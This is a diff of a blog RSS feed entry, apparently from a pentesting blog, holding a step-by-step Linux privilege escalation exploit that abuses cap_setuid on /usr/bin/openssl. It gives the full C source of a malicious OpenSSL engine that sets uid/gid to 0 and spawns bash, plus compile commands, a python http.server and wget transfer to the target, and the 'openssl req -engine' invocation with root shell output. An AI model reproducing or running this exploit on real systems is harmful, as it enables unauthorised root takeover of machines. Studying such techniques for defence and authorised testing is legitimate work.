@@ -12,24 +12,23 @@
         <pubDate>Thu, 17 Jun 2021 00:00:00 +0000</pubDate>
         
         <guid>/p/how-to-openssl-cap_setuid-ep-privesc-exploit/</guid>
-        <description>&lt;img src="https://i.imgur.com/rZQE6hL.png" alt="Featured image of post How to: OpenSSL cap_setuid&#43;ep PrivEsc Exploit" /&gt;&lt;p&gt;Consider the binary &lt;code&gt;/usr/bin/openssl&lt;/code&gt; has capabilities set as the following.&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;/usr/bin/openssl = cap_setuid+ep&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;Is there a way to become root from a normal user by using this? YES! Let&amp;rsquo;s explore how.&lt;/p&gt;
-&lt;h3 id=&#34;checklist-will-it-work-for-me&#34;&gt;Checklist: Will It Work For Me?&lt;/h3&gt;
-&lt;p&gt;Search all the binaries&#39; capibilities using: &lt;code&gt;getcap -r / 2&amp;gt;/dev/null&lt;/code&gt;.
-Explaination:&lt;/p&gt;
+        <description>&lt;img src="https://i.imgur.com/rZQE6hL.png" alt="Featured image of post How to: OpenSSL cap_setuid&#43;ep PrivEsc Exploit" /&gt;&lt;p&gt;Consider the binary &lt;code&gt;/usr/bin/openssl&lt;/code&gt; has capabilities set as: &lt;code&gt;/usr/bin/openssl = cap_setuid+ep&lt;/code&gt;
+Is there a way to become root from a normal user by using this?&lt;/p&gt;
+&lt;p&gt;YES! Let&amp;rsquo;s explore how.&lt;/p&gt;
+&lt;h3 id=&#34;0-checklist-will-it-work-for-me&#34;&gt;0. Checklist: Will It Work For Me?&lt;/h3&gt;
+&lt;p&gt;Search all the binaries&#39; capibilities using: &lt;code&gt;getcap -r / 2&amp;gt;/dev/null&lt;/code&gt;.&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;code&gt;getcap&lt;/code&gt; is the tool we will use&lt;/li&gt;
 &lt;li&gt;&lt;code&gt;-r&lt;/code&gt; is the recursive flag&lt;/li&gt;
 &lt;li&gt;&lt;code&gt;2&amp;gt;/dev/null&lt;/code&gt; directs the standard error stream to &lt;code&gt;/dev/null&lt;/code&gt;&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;If you see &lt;code&gt;/usr/bin/openssl = cap_setuid+ep&lt;/code&gt;, we are set for success.&lt;/p&gt;
-&lt;h3 id=&#34;requirements-on-your-system&#34;&gt;Requirements (On Your System)&lt;/h3&gt;
+&lt;p&gt;&lt;em&gt;If you see &lt;code&gt;/usr/bin/openssl = cap_setuid+ep&lt;/code&gt;, we are set for success.&lt;/em&gt;&lt;/p&gt;
+&lt;h3 id=&#34;1-requirements-on-your-system&#34;&gt;1. Requirements (On Your System)&lt;/h3&gt;
 &lt;ol&gt;
 &lt;li&gt;We will use &lt;code&gt;#include &amp;lt;openssl/engine.h&amp;gt;&lt;/code&gt; header in our exploit engine file. On debian based systems, use: &lt;code&gt;sudo apt-get install libssl-dev&lt;/code&gt; to install.&lt;/li&gt;
 &lt;li&gt;gcc&lt;/li&gt;
 &lt;/ol&gt;
-&lt;h3 id=&#34;getting-the-exploit-ready&#34;&gt;Getting The Exploit Ready&lt;/h3&gt;
+&lt;h3 id=&#34;2-getting-the-exploit-ready&#34;&gt;2. Getting The Exploit Ready&lt;/h3&gt;
 &lt;p&gt;Create a file named &lt;code&gt;openssl-exploit-engine.c&lt;/code&gt; with contents as such:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;#include &amp;lt;openssl/engine.h&amp;gt;
 
@@ -41,15 +40,8 @@ static int bind(ENGINE *e, const char *id)
 
 IMPLEMENT_DYNAMIC_BIND_FN(bind)
 IMPLEMENT_DYNAMIC_CHECK_FN()   
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Explaination:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;we import the required header file&lt;/li&gt;
-&lt;li&gt;we create a function as specified by Reference 2 (see below)&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;setuid(0); setgid(0);&lt;/code&gt;: we set the &lt;code&gt;uid&lt;/code&gt; and &lt;code&gt;gid&lt;/code&gt; to 0&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;system(&amp;quot;/bin/bash&amp;quot;)&lt;/code&gt;: spawn a &lt;code&gt;bash&lt;/code&gt; shell&lt;/li&gt;
-&lt;li&gt;the last two lines are required by OpenSSL&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id=&#34;compiling&#34;&gt;Compiling&lt;/h3&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Check the [2] reference for more information.&lt;/p&gt;
+&lt;h3 id=&#34;3-compiling&#34;&gt;3. Compiling&lt;/h3&gt;
 &lt;p&gt;Run the following:&lt;/p&gt;
 &lt;ol&gt;
 &lt;li&gt;&lt;code&gt;gcc -fPIC -o openssl-exploit-engine.o -c openssl-exploit-engine.c&lt;/code&gt;&lt;/li&gt;
@@ -65,15 +57,14 @@ openssl-exploit-engine.c:5:3: warning: implicit declaration of function ‘setui
 openssl-exploit-engine.c:5:14: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
     5 |   setuid(0); setgid(0);
       |              ^~~~~~
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It is safe to ignore warnings here.&lt;/p&gt;
-&lt;p&gt;Resultant is the &lt;code&gt;openssl-exploit-engine.so&lt;/code&gt; file.&lt;/p&gt;
-&lt;h3 id=&#34;transferring-the-file&#34;&gt;Transferring the file&lt;/h3&gt;
-&lt;p&gt;Using &lt;code&gt;python3&lt;/code&gt;&amp;rsquo;s http server, and wget on the target machine, we can transfer the file.&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It is safe to ignore warnings here. Resultant is the &lt;code&gt;openssl-exploit-engine.so&lt;/code&gt; file.&lt;/p&gt;
+&lt;h3 id=&#34;4-transferring-the-file&#34;&gt;4. Transferring the file&lt;/h3&gt;
+&lt;p&gt;Using &lt;code&gt;python3&lt;/code&gt;&amp;rsquo;s http server, and &lt;code&gt;wget&lt;/code&gt; or &lt;code&gt;curl&lt;/code&gt; on the target machine, we can transfer the file.&lt;/p&gt;
 &lt;ol&gt;
-&lt;li&gt;start up python3 server in the directory where you have the file, as such: &lt;code&gt;sudo python3 -m http.server 80&lt;/code&gt;. this starts the server on port 80.&lt;/li&gt;
-&lt;li&gt;use wget or curl the file as such: &lt;code&gt;wget YOUR_RELEVANT_IP/openssl-exploit-engine.so&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;[on your machine] start up python3 server in the directory where you have the file, as such: &lt;code&gt;sudo python3 -m http.server 80&lt;/code&gt;. this starts the server on port 80.&lt;/li&gt;
+&lt;li&gt;[on target machine] use wget or curl the file as such: &lt;code&gt;wget YOUR_RELEVANT_IP/openssl-exploit-engine.so&lt;/code&gt;&lt;/li&gt;
 &lt;/ol&gt;
-&lt;h3 id=&#34;root-finally&#34;&gt;Root (Finally!)&lt;/h3&gt;
+&lt;h3 id=&#34;5-root-finally&#34;&gt;5. Root (Finally!)&lt;/h3&gt;
 &lt;p&gt;Once you have the file, run the following, at the location of the so file.&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;openssl req -engine ./openssl-exploit-engine.so&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;Sample output&lt;/p&gt;
@@ -81,7 +72,7 @@ openssl-exploit-engine.c:5:14: warning: implicit declaration of function ‘setg
 root@server:~# whoami
 root
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Enjoy!&lt;/p&gt;
-&lt;h3 id=&#34;common-errors&#34;&gt;Common Errors&lt;/h3&gt;
+&lt;h3 id=&#34;6-common-errors&#34;&gt;6. Common Errors&lt;/h3&gt;
 &lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
 └─$  gcc -fPIC -o openssl-exploit-engine.o -c openssl-exploit-engine.c
 openssl-exploit-engine.c:1:10: fatal error: openssl/engine.h: No such file or directory
@@ -89,7 +80,7 @@ openssl-exploit-engine.c:1:10: fatal error: openssl/engine.h: No such file or di
       |          ^~~~~~~~~~~~~~~~~~
 compilation terminated.
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If you get this error, check the section on Requirements.&lt;/p&gt;
-&lt;h3 id=&#34;references&#34;&gt;References&lt;/h3&gt;
+&lt;h3 id=&#34;7-references&#34;&gt;7. References&lt;/h3&gt;
 &lt;ol&gt;
 &lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;Read up more on capabilities&lt;/a&gt;.&lt;/li&gt;
